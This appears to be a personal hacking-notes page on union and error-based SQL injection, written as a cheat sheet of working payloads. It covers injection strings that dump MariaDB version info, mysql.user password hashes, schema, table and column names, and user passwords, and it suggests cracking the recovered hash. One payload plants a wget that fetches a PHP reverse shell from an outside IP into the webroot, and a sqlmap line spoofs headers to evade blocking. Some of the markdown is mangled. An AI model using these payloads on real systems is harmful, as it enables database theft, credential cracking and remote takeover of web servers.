---
tags: 🔻 🔻/Enumeration/sqlinjection errorsqlinjection
aliases: Hacking Notes
---

# Error based SQL

We get the output of the first select statement, but not the second. A possible reason is that the application only prints one entry at a time. So let’s modify our query to give the first select statement a cod value that doesn’t exist so that it prints out the result from the second statement.  
{\*\*\*\*\*\*\*Impotant\*\*\*\*\* read it before proceeding- → if working with id =1 union but error not showing..use invaild id so that union command can run like cod=-9999}  
\---------------------------------------------------------------------------------------------------------------  
?cod=9999 union select 1,@@version,3,4,5,6,7

`9999 union select 1,(select '<?php exec(\\"wget -O /var/www/html/shell.php ['),3,4,5,6,7">http://](http://10.10.14.12:5555/php-reverse-shell.php/)x.x.x.x ` 
  
or also can gather password of mysql

Now we know it’s using MariaDB version x.x.x.x  
  
`union select 1,(SELECT host, user, password FROM mysql.user),3,4,5,6,7 ` 
  
We get nothing because we’re querying more than one column in the sub select query. Let’s verify that by just outputting the password column.  
  
`union select 1,(SELECT password FROM mysql.user),3,4,5,6,7`  
  
We get a hash! In order to output multiple columns, you can use the group\_concat() function.  
  
`union select 1,(SELECT group\_concat(host,user,password) FROM mysql.user),3,4,5,6,7 ` 
  
It worked! Now we know that the database is running on localhost, the user is DBadmin and the hash is 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0. We can crack the hash quickly using crackstation.net.

--------------------------------------------------------------------------

`http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,table\_name,6+from%20information\_schema.tables {list all databses tables ;)}  `
`http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,column\_name,6+from%20information\_schema.columns where table\_name='users' {list all databses column of this table;)}  `
  
`http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,name,password,6+from users  `

--------------------------------------------------------------------------
  
`http://<target ip>/comment.php?id=771%20%20union%20select%201,2,3,4,gRoUp\_cOncaT(0x0a,schema\_name,0x0a),6+fRoM+information\_schema.schemata  `
	
-------------------------------------------------------------------------- 
	
To bypass blocking:  
`./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20x.x.x.x`

